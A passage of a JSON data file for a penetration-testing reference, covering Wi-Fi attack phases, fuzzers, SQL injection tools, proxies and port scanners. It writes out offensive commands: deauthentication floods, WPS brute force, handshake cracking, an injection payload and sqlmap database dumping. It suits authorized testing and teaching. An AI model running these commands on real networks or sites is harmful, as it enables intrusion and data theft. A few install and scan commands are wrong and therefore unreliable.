            "title": "Traffic Capture",
            "details": "Capture packets for offline analysis",
            "command": "airodump-ng -w capture --bssid AA:BB:CC:DD:EE:FF wlan0mon"
          }
        ]
      },
      {
        "title": "Phase 3: Vulnerability Assessment",
        "steps": [
          {
            "title": "WPS Testing",
            "details": "Test WPS for PIN recovery vulnerabilities",
            "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -o wps_results.txt"
          },
          {
            "title": "Deauthentication Attack",
            "details": "Test network stability and client behavior",
            "command": "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon"
          },
          {
            "title": "Evil Twin Testing",
            "details": "Test for rogue access point susceptibility",
            "command": "# Create fake AP with same SSID using airbase-ng"
          },
          {
            "title": "Karma Attack Testing",
            "details": "Test for automatic connection vulnerabilities",
            "command": "# Use airbase-ng with karma mode for testing"
          }
        ]
      },
      {
        "title": "Phase 4: Password Cracking",
        "steps": [
          {
            "title": "Handshake Capture",
            "details": "Capture WPA/WPA2 handshake for cracking",
            "command": "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon"
          },
          {
            "title": "Dictionary Attack",
            "details": "Attempt password cracking with wordlists",
            "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap"
          },
          {
            "title": "Brute Force Attack",
            "details": "Brute force WPA/WPA2 passwords",
            "command": "# Use hashcat or john the ripper for GPU acceleration"
          },
          {
            "title": "PMKID Attack",
            "details": "Attack WPA2 without clients using PMKID",
            "command": "# Capture PMKID and crack with hashcat"
          }
        ]
      },
      {
        "title": "Phase 5: Advanced Attacks",
        "steps": [
          {
            "title": "Packet Injection Testing",
            "details": "Test for packet injection vulnerabilities",
            "command": "aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon"
          },
          {
            "title": "Client-Side Attacks",
            "details": "Test connected clients for vulnerabilities",
            "command": "# Use various client-side attack techniques"
          },
          {
            "title": "RF Spectrum Analysis",
            "details": "Analyze RF spectrum for interference and anomalies",
            "command": "kismet -c kismet.conf -o spectrum_analysis"
          },
          {
            "title": "Bluetooth Testing",
            "details": "Test Bluetooth devices for security issues",
            "command": "# Use btscanner and other Bluetooth tools"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wireless Security Audit Timeline",
        "stages": [
          {
            "label": "Day 1: Discovery & Reconnaissance",
            "description": "Complete wireless network discovery and initial analysis",
            "command": "airmon-ng start wlan0 && airodump-ng wlan0mon --write day1_scan"
          },
          {
            "label": "Day 2: Target Analysis",
            "description": "Detailed analysis of target networks and clients",
            "command": "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target_analysis wlan0mon"
          },
          {
            "label": "Day 3: Vulnerability Testing",
            "description": "Test WPS, encryption, and configuration vulnerabilities",
            "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv && aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon"
          },
          {
            "label": "Day 4: Password Cracking",
            "description": "Capture handshakes and attempt password recovery",
            "command": "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon && aircrack-ng -w rockyou.txt capture.cap"
          },
          {
            "label": "Day 5: Advanced Testing",
            "description": "RF analysis, Bluetooth testing, and report generation",
            "command": "kismet -o rf_analysis && # Compile findings into report"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "WPS PIN vulnerable to brute force",
        "meaning": "Network can be compromised regardless of password strength",
        "severity": "Critical"
      },
      {
        "indicator": "WEP encryption detected",
        "meaning": "Network can be compromised in minutes",
        "severity": "Critical"
      },
      {
        "indicator": "Weak passphrase detected",
        "meaning": "Dictionary attack likely successful",
        "severity": "High"
      },
      {
        "indicator": "Open WiFi network detected",
        "meaning": "No authentication required for access",
        "severity": "High"
      },
      {
        "indicator": "Rogue access point detected",
        "meaning": "Potential evil twin attack in progress",
        "severity": "High"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom RF Analysis",
        "scenario": "Use SDR tools for advanced RF spectrum analysis",
        "command": "hackrf_transfer -r data.bin -f 2.4G -s 10M",
        "notes": [
          "Requires HackRF or other SDR hardware"
        ]
      },
      {
        "title": "Automated WiFi Auditing",
        "scenario": "Automate comprehensive WiFi security testing",
        "command": "wifite -i wlan0mon --all --dict /path/to/wordlist.txt",
        "notes": [
          "Automated tool for complete WiFi security testing"
        ]
      },
      {
        "title": "Bluetooth Low Energy Testing",
        "scenario": "Test BLE devices for security vulnerabilities",
        "command": "# Use gattacker and other BLE-specific tools",
        "notes": [
          "Specialized testing for IoT and BLE devices"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Wireless Attack Methods Comparison",
      "columns": ["Attack Type", "Success Rate", "Detection Risk", "Time Required", "Equipment"],
      "rows": [
        ["WPS Attack", "High", "Low", "Hours", "Standard"],
        ["Handshake Crack", "Medium", "Low", "Days", "Standard"],
        ["Evil Twin", "Very High", "High", "Minutes", "Standard"],
        ["Deauth Flood", "Low", "Very High", "Minutes", "Standard"],
        ["RF Jamming", "Low", "Very High", "Minutes", "Advanced"]
      ]
    },
    "resources": [
      {
        "label": "Kali Wireless Tools",
        "url": "https://www.kali.org/tools/wireless-attacks/",
        "description": "Complete list of wireless security tools in Kali"
      },
      {
        "label": "WiFi Security Testing Guide",
        "url": "https://www.wirelesshack.org/wifi-security-testing-guide.html",
        "description": "Comprehensive guide to WiFi security testing"
      }
    ]
  },
  {
    "id": "comparison_directory_fuzzers",
    "name": "Directory Fuzzing Tools Comparison",
    "summary": "Comprehensive comparison of directory and web content fuzzing tools including FFuf, Gobuster, DirBuster, and Wfuzz with their strengths, weaknesses, and best use cases.",
    "details": "Directory fuzzing is a critical phase of web application testing for discovering hidden content, directories, and files. This comparison helps security professionals choose the right tool for their specific needs based on performance, features, and target characteristics.",
    "installation_guides": [
      {
        "platform": "FFuf Installation",
        "summary": "Install FFuf fast web fuzzer",
        "steps": [
          {
            "detail": "go install github.com/ffuf/ffuf@latest",
            "copyable": true
          },
          {
            "detail": "ffuf -V # Verify installation",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Gobuster Installation",
        "summary": "Install Gobuster directory scanner",
        "steps": [
          {
            "detail": "sudo apt install -y gobuster",
            "copyable": true
          },
          {
            "detail": "gobuster version # Verify installation",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Wfuzz Installation",
        "summary": "Install Wfuzz web fuzzer",
        "steps": [
          {
            "detail": "sudo apt install -y wfuzz",
            "copyable": true
          },
          {
            "detail": "wfuzz -h # Verify installation",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "FFuf basic directory scan",
        "command": "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://target.example.com/FUZZ",
        "notes": [
          "Fast, concurrent directory fuzzing"
        ]
      },
      {
        "description": "Gobuster directory enumeration",
        "command": "gobuster dir -u https://target.example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "notes": [
          "Reliable, feature-rich directory scanning"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Tool Selection Criteria",
        "steps": [
          {
            "title": "Performance Requirements",
            "details": "Choose based on speed and concurrency needs",
            "command": "# FFuf for speed, Gobuster for reliability"
          },
          {
            "title": "Feature Requirements",
            "details": "Consider specific features needed for testing",
            "command": "# Wfuzz for advanced filtering, DirBuster for GUI"
          },
          {
            "title": "Target Compatibility",
            "details": "Ensure tool compatibility with target technology",
            "command": "# Test different tools against target stack"
          },
          {
            "title": "Wordlist Optimization",
            "details": "Select appropriate wordlists for each tool",
            "command": "# Use tool-specific optimized wordlists"
          }
        ]
      },
      {
        "title": "Comparative Testing Process",
        "steps": [
          {
            "title": "Baseline Testing",
            "details": "Run all tools against known test target",
            "command": "ffuf -w small.txt -u https://test.com/FUZZ && gobuster dir -u https://test.com -w small.txt"
          },
          {
            "title": "Performance Comparison",
            "details": "Compare speed and resource usage",
            "command": "# Time each tool and monitor resource consumption"
          },
          {
            "title": "Results Analysis",
            "details": "Compare results and identify unique findings",
            "command": "# Analyze overlap and unique discoveries"
          },
          {
            "title": "Tool Selection",
            "details": "Select best tool for specific engagement",
            "command": "# Choose based on test requirements and results"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Directory Fuzzing Tool Selection Workflow",
        "stages": [
          {
            "label": "Assessment Phase",
            "description": "Evaluate requirements and target characteristics",
            "command": "# Analyze target stack, time constraints, and resources"
          },
          {
            "label": "Tool Testing",
            "description": "Test multiple tools against target",
            "command": "ffuf -w test.txt -u https://target.com/FUZZ -o ffuf_results.txt"
          },
          {
            "label": "Comparison Analysis",
            "description": "Compare performance and results",
            "command": "# Analyze speed, accuracy, and resource usage"
          },
          {
            "label": "Final Selection",
            "description": "Choose optimal tool for engagement",
            "command": "# Select based on requirements and test results"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "FFuf shows higher requests/second",
        "meaning": "Better performance for large-scale scans",
        "severity": "Info"
      },
      {
        "indicator": "Gobuster finds unique directories",
        "meaning": "Different algorithms may find different results",
        "severity": "Info"
      },
      {
        "indicator": "Wfuzz provides more filtering options",
        "meaning": "Better for targeted, refined searches",
        "severity": "Info"
      },
      {
        "indicator": "Tool A misses directory found by Tool B",
        "meaning": "Use multiple tools for comprehensive coverage",
        "severity": "Medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom FFuf Filters",
        "scenario": "Create advanced filtering rules for FFuf",
        "command": "ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302 -fl 10-20",
        "notes": [
          "Fine-tune results with custom filters"
        ]
      },
      {
        "title": "Gobuster Recursion",
        "scenario": "Configure recursive directory discovery",
        "command": "gobuster dir -u https://target.com -w wordlist.txt -r -e",
        "notes": [
          "Automatically discover nested directories"
        ]
      },
      {
        "title": "Wfuzz Post-processing",
        "scenario": "Use Wfuzz with custom post-processing scripts",
        "command": "wfuzz -w wordlist.txt --script=custom.py https://target.com/FUZZ",
        "notes": [
          "Extend functionality with custom scripts"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Directory Fuzzing Tools Feature Comparison",
      "columns": ["Feature", "FFuf", "Gobuster", "DirBuster", "Wfuzz"],
      "rows": [
        ["Speed", "Very Fast", "Fast", "Slow", "Medium"],
        ["Concurrency", "Excellent", "Good", "Limited", "Good"],
        ["Filtering", "Advanced", "Basic", "Basic", "Advanced"],
        ["Recursion", "Limited", "Built-in", "Good", "Manual"],
        ["Extensions", "Built-in", "Built-in", "Manual", "Manual"],
        ["GUI", "No", "No", "Yes", "No"],
        ["Memory Usage", "Low", "Medium", "High", "Medium"],
        ["Learning Curve", "Easy", "Easy", "Easy", "Medium"],
        ["Customization", "High", "Medium", "Low", "Very High"],
        ["Best For", "Speed", "Reliability", "Beginners", "Advanced"]
      ]
    },
    "resources": [
      {
        "label": "FFuf GitHub",
        "url": "https://github.com/ffuf/ffuf",
        "description": "Official FFuf repository and documentation"
      },
      {
        "label": "Gobuster Documentation",
        "url": "https://github.com/OJ/gobuster",
        "description": "Complete Gobuster documentation and examples"
      },
      {
        "label": "SecLists Wordlists",
        "url": "https://github.com/danielmiessler/SecLists",
        "description": "Comprehensive collection of wordlists for fuzzing"
      }
    ]
  },
  {
    "id": "comparison_sql_testing",
    "name": "SQL Testing Tools Comparison",
    "summary": "Detailed comparison of SQL injection testing tools including sqlmap, Burp Suite, OWASP ZAP, and manual testing approaches with their effectiveness, stealth, and use cases.",
    "details": "SQL injection remains one of the most critical web application vulnerabilities. This comparison helps security professionals choose the most appropriate tools and techniques for SQL injection testing based on target characteristics, time constraints, and detection avoidance requirements.",
    "installation_guides": [
      {
        "platform": "SQLMap Installation",
        "summary": "Install SQLMap automatic SQL injection tool",
        "steps": [
          {
            "detail": "sudo apt install -y sqlmap",
            "copyable": true
          },
          {
            "detail": "git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Burp Suite Setup",
        "summary": "Configure Burp Suite for SQL injection testing",
        "steps": [
          {
            "detail": "Download Burp Suite Community or Professional",
            "copyable": false
          },
          {
            "detail": "Configure browser proxy to 127.0.0.1:8080",
            "copyable": false
          },
          {
            "detail": "Enable SQL injection scanner in Intruder tab",
            "copyable": false
          }
        ]
      },
      {
        "platform": "OWASP ZAP Setup",
        "summary": "Set up OWASP ZAP for automated SQL testing",
        "steps": [
          {
            "detail": "sudo apt install -y zaproxy",
            "copyable": true
          },
          {
            "detail": "Configure browser proxy to 127.0.0.1:8080",
            "copyable": false
          },
          {
            "detail": "Enable Active Scan with SQL injection rules",
            "copyable": false
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "SQLMap automatic testing",
        "command": "sqlmap -u \"https://target.com/page?id=1\" --batch --dbs",
        "notes": [
          "Automated SQL injection detection and exploitation"
        ]
      },
      {
        "description": "Manual SQL injection test",
        "command": "https://target.com/page?id=1' OR '1'='1",
        "notes": [
          "Basic manual SQL injection test"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "SQL Injection Testing Methodology",
        "steps": [
          {
            "title": "Initial Detection",
            "details": "Test for basic SQL injection vulnerabilities",
            "command": "# Test with single quotes, AND 1=1, OR 1=1"
          },
          {
            "title": "Error Analysis",
            "details": "Analyze database errors for information disclosure",
            "command": "# Trigger errors to extract database information"
          },
          {
            "title": "Automated Scanning",
            "details": "Use automated tools for comprehensive testing",
            "command": "sqlmap -u \"https://target.com/page?id=1\" --batch"
          },
          {
            "title": "Manual Verification",
            "details": "Manually verify automated findings",
            "command": "# Create custom payloads for verification"
          }
        ]
      },
      {
        "title": "Advanced SQL Injection Techniques",
        "steps": [
          {
            "title": "Blind SQL Injection",
            "details": "Test for blind SQL injection vulnerabilities",
            "command": "# Use time-based and boolean-based techniques"
          },
          {
            "title": "Second-Order Injection",
            "details": "Test for stored SQL injection vulnerabilities",
            "command": "# Test input storage and later use points"
          },
          {
            "title": "WAF Bypass",
            "details": "Bypass web application firewalls",
            "command": "# Use encoding, fragmentation, and obfuscation"
          },
          {
            "title": "NoSQL Injection",
            "details": "Test NoSQL databases for injection vulnerabilities",
            "command": "# Test MongoDB, CouchDB, and other NoSQL databases"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "SQL Injection Testing Strategy",
        "stages": [
          {
            "label": "Reconnaissance Phase",
            "description": "Identify potential injection points and database type",
            "command": "# Analyze application behavior and error messages"
          },
          {
            "label": "Automated Testing",
            "description": "Run automated SQL injection scans",
            "command": "sqlmap -u \"https://target.com/page?id=1\" --batch --level=5 --risk=3"
          },
          {
            "label": "Manual Testing",
            "description": "Manual verification and advanced testing",
            "command": "# Create custom payloads and test edge cases"
          },
          {
            "label": "Exploitation",
            "description": "Exploit confirmed vulnerabilities",
            "command": "sqlmap -u \"https://target.com/page?id=1\" --batch --dbs --dump"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "MySQL error message displayed",
        "meaning": "MySQL database with error-based injection possible",
        "severity": "High"
      },
      {
        "indicator": "Time delay observed",
        "meaning": "Blind SQL injection vulnerability confirmed",
        "severity": "High"
      },
      {
        "indicator": "WAF blocking detected",
        "meaning": "Web Application Firewall present, requires bypass techniques",
        "severity": "Medium"
      },
      {
        "indicator": "Parameterized queries detected",
        "meaning": "SQL injection likely mitigated, move to other tests",
        "severity": "Info"
      }
    ],
    "advanced_usage": [
      {
        "title": "SQLMap Advanced Options",
        "scenario": "Use advanced SQLMap features for complex targets",
        "command": "sqlmap -u \"https://target.com/page?id=1\" --batch --tamper=space2comment --level=5 --risk=3",
        "notes": [
          "Use tamper scripts for WAF bypass"
        ]
      },
      {
        "title": "Burp Suite Intruder",
        "scenario": "Create custom SQL injection payloads in Burp",
        "command": "# Use Intruder with custom payload lists",
        "notes": [
          "Customize payloads for specific database types"
        ]
      },
      {
        "title": "Custom Python Scripts",
        "scenario": "Create custom SQL injection testing scripts",
        "command": "# Use requests library for custom automation",
        "notes": [
          "Full control over requests and responses"
        ]
      }
    ],
    "comparison_table": {
      "caption": "SQL Testing Tools Comparison",
      "columns": ["Aspect", "SQLMap", "Burp Suite", "OWASP ZAP", "Manual Testing"],
      "rows": [
        ["Automation", "Full", "Partial", "Good", "None"],
        ["Speed", "Fast", "Medium", "Medium", "Slow"],
        ["Stealth", "Low", "Medium", "Medium", "High"],
        ["Coverage", "Comprehensive", "Good", "Good", "Limited"],
        ["Customization", "High", "High", "Medium", "Very High"],
        ["Learning Curve", "Easy", "Medium", "Easy", "Hard"],
        ["False Positives", "Low", "Low", "Medium", "None"],
        ["WAF Bypass", "Good", "Good", "Limited", "Excellent"],
        ["Database Support", "Excellent", "Good", "Good", "Excellent"],
        ["Best For", "Automation", "Professional", "Free Testing", "Stealth"]
      ]
    },
    "resources": [
      {
        "label": "SQLMap Documentation",
        "url": "http://sqlmap.org/",
        "description": "Official SQLMap documentation and user guide"
      },
      {
        "label": "Burp Suite SQL Injection Guide",
        "url": "https://portswigger.net/burp/documentation/desktop/testing/scanning/sql-injection",
        "description": "Comprehensive SQL injection testing guide"
      },
      {
        "label": "OWASP SQL Injection Prevention",
        "url": "https://owasp.org/www-community/attacks/SQL_Injection",
        "description": "SQL injection prevention and testing techniques"
      }
    ]
  },
  {
    "id": "comparison_web_proxies",
    "name": "Web Proxy Tools Comparison",
    "summary": "Comprehensive comparison of web application security proxies including Burp Suite, OWASP ZAP, mitmproxy, and others with their features, licensing, and use cases.",
    "details": "Web proxies are essential tools for web application security testing, providing interception, modification, and analysis capabilities. This comparison helps security professionals choose to right proxy based on their requirements, budget, and technical expertise.",
    "installation_guides": [
      {
        "platform": "Burp Suite Installation",
        "summary": "Install Burp Suite Professional or Community",
        "steps": [
          {
            "detail": "Download from https://portswigger.net/burp",
            "copyable": false
          },
          {
            "detail": "java -jar burpsuite_pro.jar # For Professional",
            "copyable": false
          },
          {
            "detail": "Configure browser proxy to 127.0.0.1:8080",
            "copyable": false
          }
        ]
      },
      {
        "platform": "OWASP ZAP Installation",
        "summary": "Install OWASP ZAP security proxy",
        "steps": [
          {
            "detail": "sudo apt install -y zaproxy",
            "copyable": true
          },
          {
            "detail": "zaproxy -port 8080 # Start ZAP proxy",
            "copyable": true
          }
        ]
      },
      {
        "platform": "mitmproxy Installation",
        "summary": "Install mitmproxy for command-line proxy",
        "steps": [
          {
            "detail": "sudo apt install -y mitmproxy",
            "copyable": true
          },
          {
            "detail": "mitmproxy --port 8080 # Start mitmproxy",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Burp Suite interception",
        "command": "# Configure browser proxy to 127.0.0.1:8080 and start Burp",
        "notes": [
          "Full-featured web application testing proxy"
        ]
      },
      {
        "description": "OWASP ZAP automated scan",
        "command": "zaproxy -port 8080 -quickurl https://target.com",
        "notes": [
          "Automated scanning with active and passive modes"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Web Proxy Selection Process",
        "steps": [
          {
            "title": "Requirement Analysis",
            "details": "Identify specific testing requirements",
            "command": "# Analyze need for automation, scripting, or advanced features"
          },
          {
            "title": "Budget Consideration",
            "details": "Consider licensing costs and budget constraints",
            "command": "# Burp Pro vs Community vs ZAP vs mitmproxy"
          },
          {
            "title": "Technical Assessment",
            "details": "Evaluate technical expertise and learning curve",
            "command": "# Consider team skill level and training requirements"
          },
          {
            "title": "Tool Evaluation",
            "details": "Test tools against target applications",
            "command": "# Test proxy with target technology stack"
          }
        ]
      },
      {
        "title": "Proxy Configuration Workflow",
        "steps": [
          {
            "title": "Browser Configuration",
            "details": "Configure browser to use proxy",
            "command": "# Set browser proxy to 127.0.0.1:8080"
          },
          {
            "title": "SSL Certificate",
            "details": "Install proxy SSL certificate",
            "command": "# Import proxy CA certificate into browser"
          },
          {
            "title": "Target Configuration",
            "details": "Configure target scope and rules",
            "command": "# Define target scope in proxy configuration"
          },
          {
            "title": "Testing Validation",
            "details": "Validate proxy is intercepting traffic",
            "command": "# Browse target and verify traffic capture"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Web Proxy Implementation Strategy",
        "stages": [
          {
            "label": "Planning Phase",
            "description": "Define proxy requirements and selection criteria",
            "command": "# Analyze testing scope, budget, and team skills"
          },
          {
            "label": "Setup Phase",
            "description": "Install and configure selected proxy tool",
            "command": "# Install proxy, configure browser, import certificates"
          },
          {
            "label": "Testing Phase",
            "description": "Validate proxy configuration and functionality",
            "command": "# Test interception, modification, and scanning features"
          },
          {
            "label": "Production Phase",
            "description": "Use proxy in actual security testing",
            "command": "# Conduct comprehensive web application testing"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "HTTPS traffic not decrypted",
        "meaning": "SSL certificate not properly installed",
        "severity": "High"
      },
      {
        "indicator": "Proxy not intercepting traffic",
        "meaning": "Browser proxy configuration incorrect",
        "severity": "Medium"
      },
      {
        "indicator": "Scanner missing vulnerabilities",
        "meaning": "Scope configuration or tool limitation",
        "severity": "Medium"
      },
      {
        "indicator": "Performance issues with large scans",
        "meaning": "Resource limitations or tool constraints",
        "severity": "Low"
      }
    ],
    "advanced_usage": [
      {
        "title": "Burp Suite Extender",
        "scenario": "Extend Burp Suite with custom extensions",
        "command": "# Install BApp Store extensions or custom BApps",
        "notes": [
          "Add custom functionality and automation"
        ]
      },
      {
        "title": "ZAP Scripting",
        "scenario": "Create custom ZAP scripts for automation",
        "command": "# Use ZAP scripting in Python, JavaScript, or Ruby",
        "notes": [
          "Customize scanning and testing workflows"
        ]
      },
      {
        "title": "mitmproxy API",
        "scenario": "Use mitmproxy Python API for custom workflows",
        "command": "# Write custom addons and scripts",
        "notes": [
          "Full programmatic control over proxy functionality"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Web Proxy Tools Feature Comparison",
      "columns": ["Feature", "Burp Suite Pro", "Burp Suite Community", "OWASP ZAP", "mitmproxy"],
      "rows": [
        ["Cost", "$449/year", "Free", "Free", "Free"],
        ["Scanner", "Advanced", "Limited", "Good", "None"],
        ["Intruder", "Advanced", "Basic", "Fuzzer", "None"],
        ["Repeater", "Advanced", "Basic", "Request/Response", "None"],
        ["Extensibility", "Excellent", "Good", "Excellent", "Good"],
        ["Automation", "Excellent", "Limited", "Good", "Excellent"],
        ["Mobile Support", "Excellent", "Good", "Good", "Good"],
        ["API Access", "Good", "Limited", "Excellent", "Excellent"],
        ["Learning Curve", "Medium", "Medium", "Easy", "Hard"],
        ["Best For", "Professionals", "Learning", "Free Testing", "Automation"]
      ]
    },
    "resources": [
      {
        "label": "Burp Suite Documentation",
        "url": "https://portswigger.net/burp/documentation",
        "description": "Complete Burp Suite documentation and tutorials"
      },
      {
        "label": "OWASP ZAP User Guide",
        "url": "https://www.zaproxy.org/docs/",
        "description": "Comprehensive ZAP documentation and guides"
      },
      {
        "label": "mitmproxy Documentation",
        "url": "https://docs.mitmproxy.org/",
        "description": "Complete mitmproxy documentation and scripting guide"
      }
    ]
  },
  {
    "id": "comparison_port_scanners",
    "name": "Port Scanner Tools Comparison",
    "summary": "Detailed comparison of port scanning tools including Nmap, Masscan, Naabu, and others with their speed, stealth, features, and optimal use cases.",
    "details": "Port scanning is a fundamental phase of network reconnaissance and vulnerability assessment. This comparison helps security professionals choose the most appropriate scanner based on their requirements for speed, stealth, features, and target environment.",
    "installation_guides": [
      {
        "platform": "Nmap Installation",
        "summary": "Install Nmap network scanner",
        "steps": [
          {
            "detail": "sudo apt install -y nmap",
            "copyable": true
          },
          {
            "detail": "nmap --version # Verify installation",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Masscan Installation",
        "summary": "Install Masscan high-speed scanner",
        "steps": [
          {
            "detail": "sudo apt install -y masscan",
            "copyable": true
          },
          {
            "detail": "masscan --version # Verify installation",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Naabu Installation",
        "summary": "Install Naabu fast port scanner",
        "steps": [
          {
            "detail": "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
            "copyable": true
          },
          {
            "detail": "naabu -version # Verify installation",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Nmap comprehensive scan",
        "command": "nmap -sS -sV -oN scan.txt target.example.com",
        "notes": [
          "Full-featured scan with service detection"
        ]
      },
      {
        "description": "Masscan fast discovery",
        "command": "masscan -p1-65535 target.example.com --rate=1000",
        "notes": [
          "Ultra-fast port discovery"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Port Scanner Selection Process",
        "steps": [
          {
            "title": "Speed Requirements",
            "details": "Determine required scanning speed",
            "command": "# Masscan for speed, Nmap for features"
          },
          {
            "title": "Stealth Requirements",
            "details": "Consider detection avoidance needs",
            "command": "# Nmap for stealth options, Masscan for speed"
          },
          {
            "title": "Feature Requirements",
            "details": "Identify required features and capabilities",
            "command": "# Service detection, script scanning, OS detection"
          },
          {
            "title": "Target Environment",
            "details": "Consider target network characteristics",
            "command": "# Network size, firewalls, IDS/IPS presence"
          }
        ]
      },
      {
        "title": "Multi-Tool Scanning Strategy",
        "steps": [
          {
            "title": "Initial Discovery",
            "details": "Use fast scanner for initial port discovery",
            "command": "masscan -p1-65535 target.example.com --rate=1000 -o masscan.txt"
          },
          {
            "title": "Detailed Scanning",
            "details": "Use feature-rich scanner for detailed analysis",
            "command": "nmap -sV -sC -p $(cat masscan.txt) target.example.com"
          },
          {
            "title": "Results Correlation",
            "details": "Combine and analyze results from multiple tools",
            "command": "# Correlate findings and identify discrepancies"
          },
          {
            "title": "Verification",
            "details": "Verify critical findings with alternative tools",
            "command": "# Use additional tools to verify important discoveries"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Port Scanning Optimization Strategy",
        "stages": [
          {
            "label": "Assessment Phase",
            "description": "Evaluate scanning requirements and constraints",
            "command": "# Analyze time constraints, stealth needs, target size"
          },
          {
            "label": "Tool Selection",
            "description": "Select optimal scanner for requirements",
            "command": "# Choose based on speed, stealth, and feature needs"
          },
          {
            "label": "Execution Phase",
            "description": "Execute scanning with selected tools",
            "command": "# Run scans with appropriate timing and options"
          },
          {
            "label": "Analysis Phase",
            "description": "Analyze results and plan next steps",
            "command": "# Correlate findings and identify service vulnerabilities"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Port 80 open with HTTP service",
        "meaning": "Web server accessible, requires web application testing",
        "severity": "Medium"
      },
      {
        "indicator": "Port 22 open with SSH service",
        "meaning": "Remote access available, test for weak credentials",
        "severity": "Medium"
      },
      {
        "indicator": "Port 3389 open with RDP service",
        "meaning": "Remote desktop access, test for authentication bypasses",
        "severity": "High"
      },
      {
        "indicator": "Filtered ports detected",
        "meaning": "Firewall present, may require alternative scanning",
        "severity": "Info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Nmap Scripting Engine",
        "scenario": "Use NSE for advanced vulnerability detection",
        "command": "nmap -sC --script vuln target.example.com",
        "notes": [
          "Extensive script library for various services"
        ]
      },
      {
        "title": "Masscan Output Processing",
        "scenario": "Process Masscan output for further analysis",
        "command": "masscan -p1-65535 target --rate=1000 -oL - | grep open",
        "notes": [
          "Parse and filter results for specific needs"
        ]
      },
      {
        "title": "Custom Scanner Scripts",
        "scenario": "Create custom scanning scripts with multiple tools",
        "command": "# Combine multiple scanners in custom automation",
        "notes": [
          "Tailor scanning methodology to specific requirements"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Port Scanner Tools Comparison",
      "columns": ["Feature", "Nmap", "Masscan", "Naabu", "ZMap"],
      "rows": [
        ["Speed", "Medium", "Very Fast", "Fast", "Very Fast"],
        ["Stealth", "Excellent", "Limited", "Good", "Limited"],
        ["Service Detection", "Excellent", "None", "None", "None"],
        ["Script Scanning", "Excellent", "None", "None", "None"],
        ["OS Detection", "Excellent", "None", "None", "None"],
        ["Concurrency", "Good", "Excellent", "Excellent", "Excellent"],
        ["Memory Usage", "Medium", "Low", "Low", "Low"],
        ["Learning Curve", "Medium", "Easy", "Easy", "Medium"],
        ["Customization", "Excellent", "Good", "Good", "Good"],
        ["Best For", "Comprehensive", "Speed", "Discovery", "Internet-scale"]
      ]
    },
    "resources": [
      {
        "label": "Nmap Official Guide",
        "url": "https://nmap.org/book/",
        "description": "Complete Nmap documentation and reference guide"
      },
      {
        "label": "Masscan GitHub",
        "url": "https://github.com/robertdavidgraham/masscan",
        "description": "Masscan source code and documentation"
      },
      {
        "label": "ProjectDiscovery Naabu",
        "url": "https://github.com/projectdiscovery/naabu",
        "description": "Naabu fast port scanner documentation"
      }
    ]
  },
  {
    "id": "bugbounty_scope_recon",
    "name": "Bug Bounty - Scope Reconnaissance",
    "summary": "Comprehensive scope reconnaissance workflow for bug bounty programs, including asset discovery, scope validation, attack surface mapping, and compliance verification.",
    "details": "This workflow provides a systematic approach to bug bounty scope reconnaissance, ensuring thorough coverage of all in-scope assets while avoiding out-of-scope testing. It combines automated discovery with manual validation to create a complete attack surface map with evidence suitable for bounty program documentation.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install reconnaissance tools and dependencies",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y git python3 python3-pip",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y amass sublist3rtheharvester dnsrecon nmap",
            "copyable": true
          },
          {
            "detail": "pip3 install subfinder assetfinder httpx-tools nuclei",
            "copyable": true
          },
          {
            "detail": "go install -v github.com/projectdiscovery/httpx@latest",
            "copyable": true
          },
          {
            "detail": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install with Kali repositories and additional tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y amass sublist3r theharvester dnsrecon",
